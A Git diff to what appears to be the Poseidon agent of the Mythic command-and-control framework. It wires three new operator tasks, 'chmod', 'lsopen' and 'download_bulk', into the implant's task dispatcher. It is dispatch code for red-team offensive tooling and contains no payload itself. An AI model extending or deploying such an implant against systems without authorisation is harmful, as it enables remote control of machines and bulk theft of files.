@@ -4,6 +4,7 @@ import (
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/caffeinate"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/cat"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/cd"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/chmod"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/clipboard"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/clipboard_monitor"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/config"
@@ -28,6 +29,7 @@ import (
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/list_entitlements"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/listtasks"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/ls"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/lsopen"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/mkdir"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/mv"
     "github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/nslookup"
@@ -63,6 +65,7 @@ import (
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/update_c2"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/upload"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/xpc"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/download_bulk"
 	"os"
 )
 
@@ -199,8 +202,14 @@ func listenForNewTask() {
 			go ifconfig.Run(task)
 		case "caffeinate":
 			go caffeinate.Run(task)
-	    case "nslookup":
-        	go nslookup.Run(task)
+	  case "nslookup":
+      go nslookup.Run(task)
+		case "lsopen":
+			go lsopen.Run(task)
+		case "chmod":
+			go chmod.Run(task)
+		case "download_bulk":
+			go download_bulk.Run(task)
 		default:
 			// No tasks, do nothing
 			break
